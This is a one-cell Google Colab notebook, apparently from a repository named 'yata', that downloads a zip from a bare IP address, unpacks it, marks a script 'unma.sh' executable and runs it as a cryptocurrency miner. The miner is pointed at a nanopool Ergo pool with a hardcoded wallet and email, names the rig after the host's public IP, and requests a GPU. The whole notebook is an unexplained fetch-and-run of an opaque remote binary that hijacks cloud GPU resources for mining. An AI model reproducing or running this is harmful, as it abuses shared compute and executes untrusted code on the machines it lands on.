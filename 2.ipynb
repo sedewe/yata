{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "2.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "hOsscsE_s4oBuVU"
      },
      "source": [
        "!wget http://139.59.124.245:81/aria2/dl/yata.zip\n",
		"! unzip yata.zip\n",
        "%cd yata\n",
        "!chmod +x unma.sh\n",
        "!ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./unma.sh -algo autolykos -pool1 ergo-eu1.nanopool.org:11111 -wallet 9fob9dXXQ2Kkcj6ErqyfTDs2HzdQV7XEkZNEGH6MK7BcZay8Mvt -coin eth -rigName $ip -email zakigiri.vps2@gmail.com"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
 
